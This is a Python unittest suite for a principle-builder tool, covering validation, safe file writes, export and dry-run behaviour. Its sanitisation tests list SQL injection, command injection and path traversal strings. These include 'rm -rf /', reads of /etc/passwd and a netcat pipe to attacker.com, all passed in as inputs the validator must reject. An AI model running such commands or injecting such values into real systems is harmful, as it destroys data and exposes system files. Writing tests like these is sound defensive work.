#!/usr/bin/env python3
"""
Test suite for principle_builder tool.

Demonstrates Principle #09 (Tests as Quality Gate)
"""

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

# Import the improved version
import principle_builder_improved as pb


class TestPrincipleBuilder(unittest.TestCase):
    """Test cases for principle builder tool."""

    def test_validate_principle_number(self):
        """Test principle number validation."""
        # Valid numbers
        self.assertEqual(pb.validate_principle_number(1), 1)
        self.assertEqual(pb.validate_principle_number(44), 44)
        self.assertEqual(pb.validate_principle_number(25), 25)

        # Invalid numbers
        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_number(0)
        self.assertIn("between 1 and 44", str(cm.exception))

        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_number(45)
        self.assertIn("between 1 and 44", str(cm.exception))

        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_number(-1)
        self.assertIn("between 1 and 44", str(cm.exception))

    def test_validate_principle_name(self):
        """Test principle name validation for security."""
        # Valid names
        self.assertEqual(pb.validate_principle_name("valid-name"), "valid-name")
        self.assertEqual(pb.validate_principle_name("test_123"), "test_123")
        self.assertEqual(pb.validate_principle_name("CamelCase"), "camelcase")

        # Invalid names - path traversal attempts
        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_name("../etc/passwd")
        # The '/' triggers the invalid character check first
        self.assertIn("Use only alphanumeric", str(cm.exception))

        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_name("../../secret")
        # Both '.' and '/' are invalid characters
        self.assertTrue("Use only alphanumeric" in str(cm.exception) or "Path separators" in str(cm.exception))

        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_name("test/path")
        # The '/' triggers the invalid character check
        self.assertIn("Use only alphanumeric", str(cm.exception))

        # Invalid characters
        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_name("test@hack.com")
        self.assertIn("Use only alphanumeric", str(cm.exception))

        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_name("test;rm -rf")
        self.assertIn("Use only alphanumeric", str(cm.exception))

        # Too long name
        long_name = "a" * 101
        with self.assertRaises(ValueError) as cm:
            pb.validate_principle_name(long_name)
        self.assertIn("too long", str(cm.exception))

    def test_get_category_from_number(self):
        """Test category determination from principle number."""
        # People category (1-6)
        self.assertEqual(pb.get_category_from_number(1), "people")
        self.assertEqual(pb.get_category_from_number(6), "people")

        # Process category (7-19)
        self.assertEqual(pb.get_category_from_number(7), "process")
        self.assertEqual(pb.get_category_from_number(19), "process")

        # Technology category (20-37)
        self.assertEqual(pb.get_category_from_number(20), "technology")
        self.assertEqual(pb.get_category_from_number(37), "technology")

        # Governance category (38-44)
        self.assertEqual(pb.get_category_from_number(38), "governance")
        self.assertEqual(pb.get_category_from_number(44), "governance")

        # Invalid numbers
        self.assertIsNone(pb.get_category_from_number(0))
        self.assertIsNone(pb.get_category_from_number(45))
        self.assertIsNone(pb.get_category_from_number(-1))

    def test_safe_write_file_idempotency(self):
        """Test that safe_write_file respects idempotency."""
        with tempfile.TemporaryDirectory() as temp_dir:
            test_file = Path(temp_dir) / "test.txt"
            content = "test content"

            # First write should succeed
            pb.safe_write_file(test_file, content)
            self.assertTrue(test_file.exists())
            self.assertEqual(test_file.read_text(), content)

            # Second write without force should fail
            with self.assertRaises(FileExistsError) as cm:
                pb.safe_write_file(test_file, "new content")
            self.assertIn("already exists", str(cm.exception))

            # Write with force should succeed
            new_content = "forced content"
            pb.safe_write_file(test_file, new_content, force=True)
            self.assertEqual(test_file.read_text(), new_content)

    def test_safe_read_file_errors(self):
        """Test safe_read_file error handling."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Non-existent file
            non_existent = Path(temp_dir) / "missing.txt"
            with self.assertRaises(FileNotFoundError) as cm:
                pb.safe_read_file(non_existent)
            self.assertIn("not found", str(cm.exception))

            # Create file with invalid UTF-8
            bad_file = Path(temp_dir) / "bad.txt"
            bad_file.write_bytes(b"\x80\x81\x82")  # Invalid UTF-8
            with self.assertRaises(ValueError) as cm:
                pb.safe_read_file(bad_file)
            self.assertIn("not valid UTF-8", str(cm.exception))

    def test_atomic_write(self):
        """Test that writes are atomic using temp files."""
        with tempfile.TemporaryDirectory() as temp_dir:
            test_file = Path(temp_dir) / "atomic.txt"

            # Mock write failure
            with patch.object(Path, "write_text") as mock_write:
                mock_write.side_effect = PermissionError("Mock error")

                with self.assertRaises(PermissionError):
                    pb.safe_write_file(test_file, "content")

                # Ensure temp file is cleaned up
                temp_files = list(Path(temp_dir).glob("*.tmp"))
                self.assertEqual(len(temp_files), 0, "Temp file not cleaned up")

    def test_validate_all_principles(self):
        """Test batch validation functionality."""
        # This is a mock test since we don't have the full environment
        with patch("principle_builder_improved.validate_principle") as mock_validate:
            # Mock some results
            mock_validate.side_effect = [
                {"valid": True, "errors": [], "warnings": []},
                {"valid": False, "errors": ["Missing sections"], "warnings": []},
            ] * 22  # Repeat for all 44 principles

            results = pb.validate_all_principles()

            # Should have called validate for all principles
            self.assertEqual(mock_validate.call_count, 44)
            self.assertEqual(len(results), 44)

    def test_export_to_json(self):
        """Test JSON export functionality."""
        with tempfile.TemporaryDirectory() as temp_dir:
            output_file = Path(temp_dir) / "export.json"

            with patch("principle_builder_improved.list_principles") as mock_list:
                mock_list.return_value = [
                    {"number": 1, "name": "test-1", "category": "people", "status": "complete"},
                    {"number": 2, "name": "test-2", "category": "people", "status": "incomplete"},
                ]

                pb.export_to_json(output_file)

                # Verify file was created
                self.assertTrue(output_file.exists())

                # Verify JSON content
                data = json.loads(output_file.read_text())
                self.assertEqual(len(data), 2)
                self.assertEqual(data[0]["number"], 1)
                self.assertEqual(data[1]["status"], "incomplete")

    def test_dry_run_mode(self):
        """Test dry-run mode doesn't create files."""
        with (
            tempfile.TemporaryDirectory() as temp_dir,
            patch("principle_builder_improved.get_project_root") as mock_root,
        ):
            # Mock the project root
            mock_root.return_value = Path(temp_dir)

            # Create mock template
            template_path = Path(temp_dir) / "TEMPLATE.md"
            template_path.write_text(
                "# Principle #{number} - {Full Name}\n"
                "**Category**: {People | Process | Technology | Governance}\n"
                "**Status**: {Draft | Review | Complete}\n"
                "**Date**: {YYYY-MM-DD}\n"
                "**Version**: {1.0, 1.1, etc.}\n"
            )

            # Run create in dry-run mode
            output_path = pb.create_principle_stub(number=1, name="test-principle", dry_run=True)

            # File should NOT exist
            self.assertFalse(output_path.exists())


class TestSanitization(unittest.TestCase):
    """Security-focused tests for input sanitization."""

    def test_sql_injection_attempts(self):
        """Test that SQL injection attempts are blocked."""
        injection_attempts = [
            "'; DROP TABLE principles; --",
            "1 OR 1=1",
            "' UNION SELECT * FROM users --",
            "test'); DELETE FROM principles; --",
        ]

        for attempt in injection_attempts:
            with self.assertRaises(ValueError):
                pb.validate_principle_name(attempt)

    def test_command_injection_attempts(self):
        """Test that command injection attempts are blocked."""
        command_attempts = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test`whoami`",
            "$(rm -rf /)",
            "test$IFS$9cat$IFS$9/etc/passwd",
        ]

        for attempt in command_attempts:
            with self.assertRaises(ValueError):
                pb.validate_principle_name(attempt)

    def test_path_traversal_attempts(self):
        """Test comprehensive path traversal prevention."""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "test/../../../secret",
            "test/..",
            "test\\..\\..\\",
            "%2e%2e%2f%2e%2e%2f",  # URL encoded ../
            "test/../../..",
        ]

        for attempt in traversal_attempts:
            with self.assertRaises(ValueError) as cm:
                pb.validate_principle_name(attempt)
            # Verify it's caught as path traversal, not just invalid chars
            self.assertTrue("Path separators" in str(cm.exception) or "Invalid principle name" in str(cm.exception))


if __name__ == "__main__":
    unittest.main()
